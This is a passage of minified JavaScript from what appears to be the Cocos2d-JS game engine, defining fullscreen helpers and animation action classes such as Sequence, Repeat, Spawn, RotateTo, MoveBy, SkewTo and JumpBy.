	exitFullScreen: function() {
		return this._supportsFullScreen ? document[this._fn.exitFullscreen]() : !0
	},
	autoFullScreen: function(a, b) {
		function e() {
			d.requestFullScreen(a, b), c.removeEventListener(d._touchEvent, e)
		}
		a = a || document.body;
		var c = cc._canvas || a,
			d = this;
		this.requestFullScreen(a, b), cc._addEventListener(c, this._touchEvent, e)
	}
}, cc.screen.init();
cc.ACTION_TAG_INVALID = -1, cc.Action = cc.Class.extend({
	originalTarget: null,
	target: null,
	tag: cc.ACTION_TAG_INVALID,
	ctor: function() {
		this.originalTarget = null, this.target = null, this.tag = cc.ACTION_TAG_INVALID
	},
	copy: function() {
		return cc.log("copy is deprecated. Please use clone instead."), this.clone()
	},
	clone: function() {
		var a = new cc.Action;
		return a.originalTarget = null, a.target = null, a.tag = this.tag, a
	},
	isDone: function() {
		return !0
	},
	startWithTarget: function(a) {
		this.originalTarget = a, this.target = a
	},
	stop: function() {
		this.target = null
	},
	step: function() {
		cc.log("[Action step]. override me")
	},
	update: function() {
		cc.log("[Action update]. override me")
	},
	getTarget: function() {
		return this.target
	},
	setTarget: function(a) {
		this.target = a
	},
	getOriginalTarget: function() {
		return this.originalTarget
	},
	setOriginalTarget: function(a) {
		this.originalTarget = a
	},
	getTag: function() {
		return this.tag
	},
	setTag: function(a) {
		this.tag = a
	},
	retain: function() {},
	release: function() {}
}), cc.Action.create = function() {
	return new cc.Action
}, cc.FiniteTimeAction = cc.Action.extend({
	_duration: 0,
	ctor: function() {
		cc.Action.prototype.ctor.call(this), this._duration = 0
	},
	getDuration: function() {
		return this._duration * (this._times || 1)
	},
	setDuration: function(a) {
		this._duration = a
	},
	reverse: function() {
		return cc.log("cocos2d: FiniteTimeAction#reverse: Implement me"), null
	},
	clone: function() {
		return new cc.FiniteTimeAction
	}
}), cc.Speed = cc.Action.extend({
	_speed: 0,
	_innerAction: null,
	ctor: function(a, b) {
		cc.Action.prototype.ctor.call(this), this._speed = 0, this._innerAction = null, a && this.initWithAction(a, b)
	},
	getSpeed: function() {
		return this._speed
	},
	setSpeed: function(a) {
		this._speed = a
	},
	initWithAction: function(a, b) {
		if (!a) throw "cc.Speed.initWithAction(): action must be non nil";
		return this._innerAction = a, this._speed = b, !0
	},
	clone: function() {
		var a = new cc.Speed;
		return a.initWithAction(this._innerAction.clone(), this._speed), a
	},
	startWithTarget: function(a) {
		cc.Action.prototype.startWithTarget.call(this, a), this._innerAction.startWithTarget(a)
	},
	stop: function() {
		this._innerAction.stop(), cc.Action.prototype.stop.call(this)
	},
	step: function(a) {
		this._innerAction.step(a * this._speed)
	},
	isDone: function() {
		return this._innerAction.isDone()
	},
	reverse: function() {
		return cc.Speed.create(this._innerAction.reverse(), this._speed)
	},
	setInnerAction: function(a) {
		this._innerAction != a && (this._innerAction = a)
	},
	getInnerAction: function() {
		return this._innerAction
	}
}), cc.Speed.create = function(a, b) {
	return new cc.Speed(a, b)
}, cc.Follow = cc.Action.extend({
	_followedNode: null,
	_boundarySet: !1,
	_boundaryFullyCovered: !1,
	_halfScreenSize: null,
	_fullScreenSize: null,
	leftBoundary: 0,
	rightBoundary: 0,
	topBoundary: 0,
	bottomBoundary: 0,
	_worldRect: null,
	ctor: function(a, b) {
		cc.Action.prototype.ctor.call(this), this._followedNode = null, this._boundarySet = !1, this._boundaryFullyCovered = !1, this._halfScreenSize = null, this._fullScreenSize = null, this.leftBoundary = 0, this.rightBoundary = 0, this.topBoundary = 0, this.bottomBoundary = 0, this._worldRect = cc.rect(0, 0, 0, 0), a && (b ? this.initWithTarget(a, b) : this.initWithTarget(a))
	},
	clone: function() {
		var a = new cc.Follow,
			b = this._worldRect,
			c = new cc.Rect(b.x, b.y, b.width, b.height);
		return a.initWithTarget(this._followedNode, c), a
	},
	isBoundarySet: function() {
		return this._boundarySet
	},
	setBoudarySet: function(a) {
		this._boundarySet = a
	},
	initWithTarget: function(a, b) {
		if (!a) throw "cc.Follow.initWithAction(): followedNode must be non nil";
		var c = this;
		b = b || cc.rect(0, 0, 0, 0), c._followedNode = a, c._worldRect = b, c._boundarySet = !cc._rectEqualToZero(b), c._boundaryFullyCovered = !1;
		var d = cc.director.getWinSize();
		return c._fullScreenSize = cc.p(d.width, d.height), c._halfScreenSize = cc.pMult(c._fullScreenSize, .5), c._boundarySet && (c.leftBoundary = -(b.x + b.width - c._fullScreenSize.x), c.rightBoundary = -b.x, c.topBoundary = -b.y, c.bottomBoundary = -(b.y + b.height - c._fullScreenSize.y), c.rightBoundary < c.leftBoundary && (c.rightBoundary = c.leftBoundary = (c.leftBoundary + c.rightBoundary) / 2), c.topBoundary < c.bottomBoundary && (c.topBoundary = c.bottomBoundary = (c.topBoundary + c.bottomBoundary) / 2), c.topBoundary == c.bottomBoundary && c.leftBoundary == c.rightBoundary && (c._boundaryFullyCovered = !0)), !0
	},
	step: function() {
		var b = this._followedNode.x,
			c = this._followedNode.y;
		if (b = this._halfScreenSize.x - b, c = this._halfScreenSize.y - c, this._boundarySet) {
			if (this._boundaryFullyCovered) return;
			this.target.setPosition(cc.clampf(b, this.leftBoundary, this.rightBoundary), cc.clampf(c, this.bottomBoundary, this.topBoundary))
		} else this.target.setPosition(b, c)
	},
	isDone: function() {
		return !this._followedNode.running
	},
	stop: function() {
		this.target = null, cc.Action.prototype.stop.call(this)
	}
}), cc.Follow.create = function(a, b) {
	return new cc.Follow(a, b)
};
cc.ActionInstant = cc.FiniteTimeAction.extend({
	isDone: function() {
		return !0
	},
	step: function() {
		this.update(1)
	},
	update: function() {},
	reverse: function() {
		return this.clone()
	},
	clone: function() {
		return new cc.ActionInstant
	}
}), cc.Show = cc.ActionInstant.extend({
	update: function() {
		this.target.visible = !0
	},
	reverse: function() {
		return cc.Hide.create()
	},
	clone: function() {
		return new cc.Show
	}
}), cc.Show.create = function() {
	return new cc.Show
}, cc.Hide = cc.ActionInstant.extend({
	update: function() {
		this.target.visible = !1
	},
	reverse: function() {
		return cc.Show.create()
	},
	clone: function() {
		return new cc.Hide
	}
}), cc.Hide.create = function() {
	return new cc.Hide
}, cc.ToggleVisibility = cc.ActionInstant.extend({
	update: function() {
		this.target.visible = !this.target.visible
	},
	reverse: function() {
		return new cc.ToggleVisibility
	},
	clone: function() {
		return new cc.ToggleVisibility
	}
}), cc.ToggleVisibility.create = function() {
	return new cc.ToggleVisibility
}, cc.RemoveSelf = cc.ActionInstant.extend({
	_isNeedCleanUp: !0,
	ctor: function(a) {
		cc.FiniteTimeAction.prototype.ctor.call(this), void 0 !== a && this.init(a)
	},
	update: function() {
		this.target.removeFromParent(this._isNeedCleanUp)
	},
	init: function(a) {
		return this._isNeedCleanUp = a, !0
	},
	reverse: function() {
		return new cc.RemoveSelf(this._isNeedCleanUp)
	},
	clone: function() {
		return new cc.RemoveSelf(this._isNeedCleanUp)
	}
}), cc.RemoveSelf.create = function(a) {
	return new cc.RemoveSelf(a)
}, cc.FlipX = cc.ActionInstant.extend({
	_flippedX: !1,
	ctor: function(a) {
		cc.FiniteTimeAction.prototype.ctor.call(this), this._flippedX = !1, void 0 !== a && this.initWithFlipX(a)
	},
	initWithFlipX: function(a) {
		return this._flippedX = a, !0
	},
	update: function() {
		this.target.flippedX = this._flippedX
	},
	reverse: function() {
		return cc.FlipX.create(!this._flippedX)
	},
	clone: function() {
		var a = new cc.FlipX;
		return a.initWithFlipX(this._flippedX), a
	}
}), cc.FlipX.create = function(a) {
	return new cc.FlipX(a)
}, cc.FlipY = cc.ActionInstant.extend({
	_flippedY: !1,
	ctor: function(a) {
		cc.FiniteTimeAction.prototype.ctor.call(this), this._flippedY = !1, void 0 !== a && this.initWithFlipY(a)
	},
	initWithFlipY: function(a) {
		return this._flippedY = a, !0
	},
	update: function() {
		this.target.flippedY = this._flippedY
	},
	reverse: function() {
		return cc.FlipY.create(!this._flippedY)
	},
	clone: function() {
		var a = new cc.FlipY;
		return a.initWithFlipY(this._flippedY), a
	}
}), cc.FlipY.create = function(a) {
	return new cc.FlipY(a)
}, cc.Place = cc.ActionInstant.extend({
	_x: 0,
	_y: 0,
	ctor: function(a, b) {
		cc.FiniteTimeAction.prototype.ctor.call(this), this._x = 0, this._y = 0, void 0 !== a && (void 0 !== a.x && (b = a.y, a = a.x), this.initWithPosition(a, b))
	},
	initWithPosition: function(a, b) {
		return this._x = a, this._y = b, !0
	},
	update: function() {
		this.target.setPosition(this._x, this._y)
	},
	clone: function() {
		var a = new cc.Place;
		return a.initWithPosition(this._x, this._y), a
	}
}), cc.Place.create = function(a, b) {
	return new cc.Place(a, b)
}, cc.CallFunc = cc.ActionInstant.extend({
	_selectorTarget: null,
	_callFunc: null,
	_function: null,
	_data: null,
	ctor: function(a, b, c) {
		cc.FiniteTimeAction.prototype.ctor.call(this), void 0 !== a && (void 0 === b ? this.initWithFunction(a) : this.initWithFunction(a, b, c))
	},
	initWithFunction: function(a, b, c) {
		return b ? (this._data = c, this._callFunc = a, this._selectorTarget = b) : a && (this._function = a), !0
	},
	execute: function() {
		null != this._callFunc ? this._callFunc.call(this._selectorTarget, this.target, this._data) : this._function && this._function.call(null, this.target)
	},
	update: function() {
		this.execute()
	},
	getTargetCallback: function() {
		return this._selectorTarget
	},
	setTargetCallback: function(a) {
		a != this._selectorTarget && (this._selectorTarget && (this._selectorTarget = null), this._selectorTarget = a)
	},
	clone: function() {
		var a = new cc.CallFunc;
		return this._selectorTarget ? a.initWithFunction(this._callFunc, this._selectorTarget, this._data) : this._function && a.initWithFunction(this._function), a
	}
}), cc.CallFunc.create = function(a, b, c) {
	return new cc.CallFunc(a, b, c)
};
cc.ActionInterval = cc.FiniteTimeAction.extend({
	_elapsed: 0,
	_firstTick: !1,
	_easeList: null,
	_times: 1,
	_repeatForever: !1,
	_repeatMethod: !1,
	_speed: 1,
	_speedMethod: !1,
	ctor: function(a) {
		this._speed = 1, this._times = 1, this._repeatForever = !1, this.MAX_VALUE = 2, this._repeatMethod = !1, this._speedMethod = !1, cc.FiniteTimeAction.prototype.ctor.call(this), void 0 !== a && this.initWithDuration(a)
	},
	getElapsed: function() {
		return this._elapsed
	},
	initWithDuration: function(a) {
		return this._duration = 0 === a ? cc.FLT_EPSILON : a, this._elapsed = 0, this._firstTick = !0, !0
	},
	isDone: function() {
		return this._elapsed >= this._duration
	},
	_cloneDecoration: function(a) {
		a._repeatForever = this._repeatForever, a._speed = this._speed, a._times = this._times, a._easeList = this._easeList, a._speedMethod = this._speedMethod, a._repeatMethod = this._repeatMethod
	},
	_reverseEaseList: function(a) {
		if (this._easeList) {
			a._easeList = [];
			for (var b = 0; b < this._easeList.length; b++) a._easeList.push(this._easeList[b].reverse())
		}
	},
	clone: function() {
		var a = new cc.ActionInterval(this._duration);
		return this._cloneDecoration(a), a
	},
	easing: function() {
		this._easeList ? this._easeList.length = 0 : this._easeList = [];
		for (var b = 0; b < arguments.length; b++) this._easeList.push(arguments[b]);
		return this
	},
	_computeEaseTime: function(a) {
		var b = this._easeList;
		if (!b || 0 === b.length) return a;
		for (var c = 0, d = b.length; d > c; c++) a = b[c].easing(a);
		return a
	},
	step: function(a) {
		this._firstTick ? (this._firstTick = !1, this._elapsed = 0) : this._elapsed += a;
		var b = this._elapsed / (this._duration > 1.192092896e-7 ? this._duration : 1.192092896e-7);
		b = 1 > b ? b : 1, this.update(b > 0 ? b : 0), this._repeatMethod && this._times > 1 && this.isDone() && (this._repeatForever || this._times--, this.startWithTarget(this.target), this.step(this._elapsed - this._duration))
	},
	startWithTarget: function(a) {
		cc.Action.prototype.startWithTarget.call(this, a), this._elapsed = 0, this._firstTick = !0
	},
	reverse: function() {
		return cc.log("cc.IntervalAction: reverse not implemented."), null
	},
	setAmplitudeRate: function() {
		cc.log("cc.ActionInterval.setAmplitudeRate(): it should be overridden in subclass.")
	},
	getAmplitudeRate: function() {
		return cc.log("cc.ActionInterval.getAmplitudeRate(): it should be overridden in subclass."), 0
	},
	speed: function(a) {
		return 0 >= a ? (cc.log("The speed parameter error"), this) : (this._speedMethod = !0, this._speed *= a, this)
	},
	getSpeed: function() {
		return this._speed
	},
	setSpeed: function(a) {
		return this._speed = a, this
	},
	repeat: function(a) {
		return a = Math.round(a), isNaN(a) || 1 > a ? (cc.log("The repeat parameter error"), this) : (this._repeatMethod = !0, this._times *= a, this)
	},
	repeatForever: function() {
		return this._repeatMethod = !0, this._times = this.MAX_VALUE, this._repeatForever = !0, this
	}
}), cc.ActionInterval.create = function(a) {
	return new cc.ActionInterval(a)
}, cc.Sequence = cc.ActionInterval.extend({
	_actions: null,
	_split: null,
	_last: 0,
	ctor: function(a) {
		cc.ActionInterval.prototype.ctor.call(this), this._actions = [];
		var b = a instanceof Array ? a : arguments,
			c = b.length - 1;
		if (c >= 0 && null == b[c] && cc.log("parameters should not be ending with null in Javascript"), c >= 0) {
			for (var e, d = b[0], f = 1; c > f; f++) b[f] && (e = d, d = cc.Sequence.create(), d.initWithTwoActions(e, b[f]));
			this.initWithTwoActions(d, b[c])
		}
	},
	initWithTwoActions: function(a, b) {
		if (!a || !b) throw "cc.Sequence.initWithTwoActions(): arguments must all be non nil";
		var c = a._duration + b._duration;
		return this.initWithDuration(c), this._actions[0] = a, this._actions[1] = b, !0
	},
	clone: function() {
		var a = new cc.Sequence;
		return this._cloneDecoration(a), a.initWithTwoActions(this._actions[0].clone(), this._actions[1].clone()), a
	},
	startWithTarget: function(a) {
		cc.ActionInterval.prototype.startWithTarget.call(this, a), this._split = this._actions[0]._duration / this._duration, this._last = -1
	},
	stop: function() {
		-1 !== this._last && this._actions[this._last].stop(), cc.Action.prototype.stop.call(this)
	},
	update: function(a) {
		a = this._computeEaseTime(a);
		var b, c = 0,
			d = this._split,
			e = this._actions,
			f = this._last;
		d > a ? (b = 0 !== d ? a / d : 1, 0 === c && 1 === f && (e[1].update(0), e[1].stop())) : (c = 1, b = 1 === d ? 1 : (a - d) / (1 - d), -1 === f && (e[0].startWithTarget(this.target), e[0].update(1), e[0].stop()), f || (e[0].update(1), e[0].stop())), f === c && e[c].isDone() || (f !== c && e[c].startWithTarget(this.target), e[c].update(b), this._last = c)
	},
	reverse: function() {
		var a = cc.Sequence._actionOneTwo(this._actions[1].reverse(), this._actions[0].reverse());
		return this._cloneDecoration(a), this._reverseEaseList(a), a
	}
}), cc.Sequence.create = function(a) {
	var b = a instanceof Array ? a : arguments;
	b.length > 0 && null == b[b.length - 1] && cc.log("parameters should not be ending with null in Javascript");
	for (var c = b[0], d = 1; d < b.length; d++) b[d] && (c = cc.Sequence._actionOneTwo(c, b[d]));
	return c
}, cc.Sequence._actionOneTwo = function(a, b) {
	var c = new cc.Sequence;
	return c.initWithTwoActions(a, b), c
}, cc.Repeat = cc.ActionInterval.extend({
	_times: 0,
	_total: 0,
	_nextDt: 0,
	_actionInstant: !1,
	_innerAction: null,
	ctor: function(a, b) {
		cc.ActionInterval.prototype.ctor.call(this), void 0 !== b && this.initWithAction(a, b)
	},
	initWithAction: function(a, b) {
		var c = a._duration * b;
		return this.initWithDuration(c) ? (this._times = b, this._innerAction = a, a instanceof cc.ActionInstant && (this._actionInstant = !0, this._times -= 1), this._total = 0, !0) : !1
	},
	clone: function() {
		var a = new cc.Repeat;
		return this._cloneDecoration(a), a.initWithAction(this._innerAction.clone(), this._times), a
	},
	startWithTarget: function(a) {
		this._total = 0, this._nextDt = this._innerAction._duration / this._duration, cc.ActionInterval.prototype.startWithTarget.call(this, a), this._innerAction.startWithTarget(a)
	},
	stop: function() {
		this._innerAction.stop(), cc.Action.prototype.stop.call(this)
	},
	update: function(a) {
		a = this._computeEaseTime(a);
		var b = this._innerAction,
			c = this._duration,
			d = this._times,
			e = this._nextDt;
		if (a >= e) {
			for (; a > e && this._total < d;) b.update(1), this._total++, b.stop(), b.startWithTarget(this.target), e += b._duration / c, this._nextDt = e;
			a >= 1 && this._total < d && this._total++, this._actionInstant || (this._total === d ? (b.update(1), b.stop()) : b.update(a - (e - b._duration / c)))
		} else b.update(a * d % 1)
	},
	isDone: function() {
		return this._total == this._times
	},
	reverse: function() {
		var a = cc.Repeat.create(this._innerAction.reverse(), this._times);
		return this._cloneDecoration(a), this._reverseEaseList(a), a
	},
	setInnerAction: function(a) {
		this._innerAction != a && (this._innerAction = a)
	},
	getInnerAction: function() {
		return this._innerAction
	}
}), cc.Repeat.create = function(a, b) {
	return new cc.Repeat(a, b)
}, cc.RepeatForever = cc.ActionInterval.extend({
	_innerAction: null,
	ctor: function(a) {
		cc.ActionInterval.prototype.ctor.call(this), this._innerAction = null, a && this.initWithAction(a)
	},
	initWithAction: function(a) {
		if (!a) throw "cc.RepeatForever.initWithAction(): action must be non null";
		return this._innerAction = a, !0
	},
	clone: function() {
		var a = new cc.RepeatForever;
		return this._cloneDecoration(a), a.initWithAction(this._innerAction.clone()), a
	},
	startWithTarget: function(a) {
		cc.ActionInterval.prototype.startWithTarget.call(this, a), this._innerAction.startWithTarget(a)
	},
	step: function(a) {
		var b = this._innerAction;
		b.step(a), b.isDone() && (b.startWithTarget(this.target), b.step(b.getElapsed() - b._duration))
	},
	isDone: function() {
		return !1
	},
	reverse: function() {
		var a = cc.RepeatForever.create(this._innerAction.reverse());
		return this._cloneDecoration(a), this._reverseEaseList(a), a
	},
	setInnerAction: function(a) {
		this._innerAction != a && (this._innerAction = a)
	},
	getInnerAction: function() {
		return this._innerAction
	}
}), cc.RepeatForever.create = function(a) {
	return new cc.RepeatForever(a)
}, cc.Spawn = cc.ActionInterval.extend({
	_one: null,
	_two: null,
	ctor: function(a) {
		cc.ActionInterval.prototype.ctor.call(this), this._one = null, this._two = null;
		var b = a instanceof Array ? a : arguments,
			c = b.length - 1;
		if (c >= 0 && null == b[c] && cc.log("parameters should not be ending with null in Javascript"), c >= 0) {
			for (var e, d = b[0], f = 1; c > f; f++) b[f] && (e = d, d = cc.Spwan.create(), d.initWithTwoActions(e, b[f]));
			this.initWithTwoActions(d, b[c])
		}
	},
	initWithTwoActions: function(a, b) {
		if (!a || !b) throw "cc.Spawn.initWithTwoActions(): arguments must all be non null";
		var c = !1,
			d = a._duration,
			e = b._duration;
		return this.initWithDuration(Math.max(d, e)) && (this._one = a, this._two = b, d > e ? this._two = cc.Sequence._actionOneTwo(b, cc.DelayTime.create(d - e)) : e > d && (this._one = cc.Sequence._actionOneTwo(a, cc.DelayTime.create(e - d))), c = !0), c
	},
	clone: function() {
		var a = new cc.Spawn;
		return this._cloneDecoration(a), a.initWithTwoActions(this._one.clone(), this._two.clone()), a
	},
	startWithTarget: function(a) {
		cc.ActionInterval.prototype.startWithTarget.call(this, a), this._one.startWithTarget(a), this._two.startWithTarget(a)
	},
	stop: function() {
		this._one.stop(), this._two.stop(), cc.Action.prototype.stop.call(this)
	},
	update: function(a) {
		a = this._computeEaseTime(a), this._one && this._one.update(a), this._two && this._two.update(a)
	},
	reverse: function() {
		var a = cc.Spawn._actionOneTwo(this._one.reverse(), this._two.reverse());
		return this._cloneDecoration(a), this._reverseEaseList(a), a
	}
}), cc.Spawn.create = function(a) {
	var b = a instanceof Array ? a : arguments;
	b.length > 0 && null == b[b.length - 1] && cc.log("parameters should not be ending with null in Javascript");
	for (var c = b[0], d = 1; d < b.length; d++) null != b[d] && (c = this._actionOneTwo(c, b[d]));
	return c
}, cc.Spawn._actionOneTwo = function(a, b) {
	var c = new cc.Spawn;
	return c.initWithTwoActions(a, b), c
}, cc.RotateTo = cc.ActionInterval.extend({
	_dstAngleX: 0,
	_startAngleX: 0,
	_diffAngleX: 0,
	_dstAngleY: 0,
	_startAngleY: 0,
	_diffAngleY: 0,
	ctor: function(a, b, c) {
		cc.ActionInterval.prototype.ctor.call(this), void 0 !== b && this.initWithDuration(a, b, c)
	},
	initWithDuration: function(a, b, c) {
		return cc.ActionInterval.prototype.initWithDuration.call(this, a) ? (this._dstAngleX = b || 0, this._dstAngleY = c || this._dstAngleX, !0) : !1
	},
	clone: function() {
		var a = new cc.RotateTo;
		return this._cloneDecoration(a), a.initWithDuration(this._duration, this._dstAngleX, this._dstAngleY), a
	},
	startWithTarget: function(a) {
		cc.ActionInterval.prototype.startWithTarget.call(this, a);
		var b = a.rotationX % 360,
			c = this._dstAngleX - b;
		c > 180 && (c -= 360), -180 > c && (c += 360), this._startAngleX = b, this._diffAngleX = c, this._startAngleY = a.rotationY % 360;
		var d = this._dstAngleY - this._startAngleY;
		d > 180 && (d -= 360), -180 > d && (d += 360), this._diffAngleY = d
	},
	reverse: function() {
		cc.log("cc.RotateTo.reverse(): it should be overridden in subclass.")
	},
	update: function(a) {
		a = this._computeEaseTime(a), this.target && (this.target.rotationX = this._startAngleX + this._diffAngleX * a, this.target.rotationY = this._startAngleY + this._diffAngleY * a)
	}
}), cc.RotateTo.create = function(a, b, c) {
	return new cc.RotateTo(a, b, c)
}, cc.RotateBy = cc.ActionInterval.extend({
	_angleX: 0,
	_startAngleX: 0,
	_angleY: 0,
	_startAngleY: 0,
	ctor: function(a, b, c) {
		cc.ActionInterval.prototype.ctor.call(this), void 0 !== b && this.initWithDuration(a, b, c)
	},
	initWithDuration: function(a, b, c) {
		return cc.ActionInterval.prototype.initWithDuration.call(this, a) ? (this._angleX = b || 0, this._angleY = c || this._angleX, !0) : !1
	},
	clone: function() {
		var a = new cc.RotateBy;
		return this._cloneDecoration(a), a.initWithDuration(this._duration, this._angleX, this._angleY), a
	},
	startWithTarget: function(a) {
		cc.ActionInterval.prototype.startWithTarget.call(this, a), this._startAngleX = a.rotationX, this._startAngleY = a.rotationY
	},
	update: function(a) {
		a = this._computeEaseTime(a), this.target && (this.target.rotationX = this._startAngleX + this._angleX * a, this.target.rotationY = this._startAngleY + this._angleY * a)
	},
	reverse: function() {
		var a = cc.RotateBy.create(this._duration, -this._angleX, -this._angleY);
		return this._cloneDecoration(a), this._reverseEaseList(a), a
	}
}), cc.RotateBy.create = function(a, b, c) {
	var d = new cc.RotateBy;
	return d.initWithDuration(a, b, c), d
}, cc.MoveBy = cc.ActionInterval.extend({
	_positionDelta: null,
	_startPosition: null,
	_previousPosition: null,
	ctor: function(a, b, c) {
		cc.ActionInterval.prototype.ctor.call(this), this._positionDelta = cc.p(0, 0), this._startPosition = cc.p(0, 0), this._previousPosition = cc.p(0, 0), void 0 !== b && this.initWithDuration(a, b, c)
	},
	initWithDuration: function(a, b, c) {
		return cc.ActionInterval.prototype.initWithDuration.call(this, a) ? (void 0 !== b.x && (c = b.y, b = b.x), this._positionDelta.x = b, this._positionDelta.y = c, !0) : !1
	},
	clone: function() {
		var a = new cc.MoveBy;
		return this._cloneDecoration(a), a.initWithDuration(this._duration, this._positionDelta), a
	},
	startWithTarget: function(a) {
		cc.ActionInterval.prototype.startWithTarget.call(this, a);
		var b = a.getPositionX(),
			c = a.getPositionY();
		this._previousPosition.x = b, this._previousPosition.y = c, this._startPosition.x = b, this._startPosition.y = c
	},
	update: function(a) {
		if (a = this._computeEaseTime(a), this.target) {
			var b = this._positionDelta.x * a,
				c = this._positionDelta.y * a,
				d = this._startPosition;
			if (cc.ENABLE_STACKABLE_ACTIONS) {
				var e = this.target.getPositionX(),
					f = this.target.getPositionY(),
					g = this._previousPosition;
				d.x = d.x + e - g.x, d.y = d.y + f - g.y, b += d.x, c += d.y, g.x = b, g.y = c, this.target.setPosition(b, c)
			} else this.target.setPosition(d.x + b, d.y + c)
		}
	},
	reverse: function() {
		var a = cc.MoveBy.create(this._duration, cc.p(-this._positionDelta.x, -this._positionDelta.y));
		return this._cloneDecoration(a), this._reverseEaseList(a), a
	}
}), cc.MoveBy.create = function(a, b, c) {
	return new cc.MoveBy(a, b, c)
}, cc.MoveTo = cc.MoveBy.extend({
	_endPosition: null,
	ctor: function(a, b, c) {
		cc.MoveBy.prototype.ctor.call(this), this._endPosition = cc.p(0, 0), void 0 !== b && this.initWithDuration(a, b, c)
	},
	initWithDuration: function(a, b, c) {
		return cc.MoveBy.prototype.initWithDuration.call(this, a, b, c) ? (void 0 !== b.x && (c = b.y, b = b.x), this._endPosition.x = b, this._endPosition.y = c, !0) : !1
	},
	clone: function() {
		var a = new cc.MoveTo;
		return this._cloneDecoration(a), a.initWithDuration(this._duration, this._endPosition), a
	},
	startWithTarget: function(a) {
		cc.MoveBy.prototype.startWithTarget.call(this, a), this._positionDelta.x = this._endPosition.x - a.getPositionX(), this._positionDelta.y = this._endPosition.y - a.getPositionY()
	}
}), cc.MoveTo.create = function(a, b, c) {
	return new cc.MoveTo(a, b, c)
}, cc.SkewTo = cc.ActionInterval.extend({
	_skewX: 0,
	_skewY: 0,
	_startSkewX: 0,
	_startSkewY: 0,
	_endSkewX: 0,
	_endSkewY: 0,
	_deltaX: 0,
	_deltaY: 0,
	ctor: function(a, b, c) {
		cc.ActionInterval.prototype.ctor.call(this), void 0 !== c && this.initWithDuration(a, b, c)
	},
	initWithDuration: function(a, b, c) {
		var d = !1;
		return cc.ActionInterval.prototype.initWithDuration.call(this, a) && (this._endSkewX = b, this._endSkewY = c, d = !0), d
	},
	clone: function() {
		var a = new cc.SkewTo;
		return this._cloneDecoration(a), a.initWithDuration(this._duration, this._endSkewX, this._endSkewY), a
	},
	startWithTarget: function(a) {
		cc.ActionInterval.prototype.startWithTarget.call(this, a), this._startSkewX = a.skewX % 180, this._deltaX = this._endSkewX - this._startSkewX, this._deltaX > 180 && (this._deltaX -= 360), this._deltaX < -180 && (this._deltaX += 360), this._startSkewY = a.skewY % 360, this._deltaY = this._endSkewY - this._startSkewY, this._deltaY > 180 && (this._deltaY -= 360), this._deltaY < -180 && (this._deltaY += 360)
	},
	update: function(a) {
		a = this._computeEaseTime(a), this.target.skewX = this._startSkewX + this._deltaX * a, this.target.skewY = this._startSkewY + this._deltaY * a
	}
}), cc.SkewTo.create = function(a, b, c) {
	return new cc.SkewTo(a, b, c)
}, cc.SkewBy = cc.SkewTo.extend({
	ctor: function(a, b, c) {
		cc.SkewTo.prototype.ctor.call(this), void 0 !== c && this.initWithDuration(a, b, c)
	},
	initWithDuration: function(a, b, c) {
		var d = !1;
		return cc.SkewTo.prototype.initWithDuration.call(this, a, b, c) && (this._skewX = b, this._skewY = c, d = !0), d
	},
	clone: function() {
		var a = new cc.SkewBy;
		return this._cloneDecoration(a), a.initWithDuration(this._duration, this._skewX, this._skewY), a
	},
	startWithTarget: function(a) {
		cc.SkewTo.prototype.startWithTarget.call(this, a), this._deltaX = this._skewX, this._deltaY = this._skewY, this._endSkewX = this._startSkewX + this._deltaX, this._endSkewY = this._startSkewY + this._deltaY
	},
	reverse: function() {
		var a = cc.SkewBy.create(this._duration, -this._skewX, -this._skewY);
		return this._cloneDecoration(a), this._reverseEaseList(a), a
	}
}), cc.SkewBy.create = function(a, b, c) {
	var d = new cc.SkewBy;
	return d && d.initWithDuration(a, b, c), d
}, cc.JumpBy = cc.ActionInterval.extend({
	_startPosition: null,
	_delta: null,
	_height: 0,
	_jumps: 0,
	_previousPosition: null,
	ctor: function(a, b, c, d, e) {
		cc.ActionInterval.prototype.ctor.call(this), this._startPosition = cc.p(0, 0), this._previousPosition = cc.p(0, 0), this._delta = cc.p(0, 0), void 0 !== d && this.initWithDuration(a, b, c, d, e)
	},
	initWithDuration: function(a, b, c, d, e) {
		return cc.ActionInterval.prototype.initWithDuration.call(this, a) ? (void 0 === e && (e = d, d = c, c = b.y, b = b.x), this._delta.x = b, this._delta.y = c, this._height = d, this._jumps = e, !0) : !1
	},
	clone: function() {
		var a = new cc.JumpBy;
		return this._cloneDecoration(a), a.initWithDuration(this._duration, this._delta, this._height, this._jumps), a
	},
	startWithTarget: function(a) {
		cc.ActionInterval.prototype.startWithTarget.call(this, a);
		var b = a.getPositionX(),
			c = a.getPositionY();
		this._previousPosition.x = b, this._previousPosition.y = c, this._startPosition.x = b, this._startPosition.y = c
	},
	update: function(a) {
		if (a = this._computeEaseTime(a), this.target) {
			var b = a * this._jumps % 1,
				c = 4 * this._height * b * (1 - b);
			c += this._delta.y * a;
			var d = this._delta.x * a,
				e = this._startPosition;
			if (cc.ENABLE_STACKABLE_ACTIONS) {
				var f = this.target.getPositionX(),
					g = this.target.getPositionY(),
					h = this._previousPosition;
				e.x = e.x + f - h.x, e.y = e.y + g - h.y, d += e.x, c += e.y, h.x = d, h.y = c, this.target.setPosition(d, c)
			} else this.target.setPosition(e.x + d, e.y + c)
		}
	},
	reverse: function() {
		var a = cc.JumpBy.create(this._duration, cc.p(-this._delta.x, -this._delta.y), this._height, this._jumps);
		return this._cloneDecoration(a), this._reverseEaseList(a), a
	}
}), cc.JumpBy.create = function(a, b, c, d, e) {
	return new cc.JumpBy(a, b, c, d, e)
}, cc.JumpTo = cc.JumpBy.extend({
	startWithTarget: function(a) {
		cc.JumpBy.prototype.startWithTarget.call(this, a), this._delta.x = this._delta.x - this._startPosition.x, this._delta.y = this._delta.y - this._startPosition.y
	},
	clone: function() {
		var a = new cc.JumpTo;
		return this._cloneDecoration(a), a.initWithDuration(this._duration, this._delta, this._height, this._jumps), a
	}
}), cc.JumpTo.create = function(a, b, c, d, e) {
	return new cc.JumpTo(a, b, c, d, e)
}, cc.bezierAt = function(a, b, c, d, e) {
	return Math.pow(1 - e, 3) * a + 3 * e * Math.pow(1 - e, 2) * b + 3 * Math.pow(e, 2) * (1 - e) * c + Math.pow(e, 3) * d
}, cc.BezierBy = cc.ActionInterval.extend({
	_config: null,
	_startPosition: null,
	_previousPosition: null,
	ctor: function(a, b) {
		cc.ActionInterval.prototype.ctor.call(this), this._config = [], this._startPosition = cc.p(0, 0), this._previousPosition = cc.p(0, 0), b && this.initWithDuration(a, b)
	},
	initWithDuration: function(a, b) {
		return cc.ActionInterval.prototype.initWithDuration.call(this, a) ? (this._config = b, !0) : !1
	},
	clone: function() {
		var a = new cc.BezierBy;
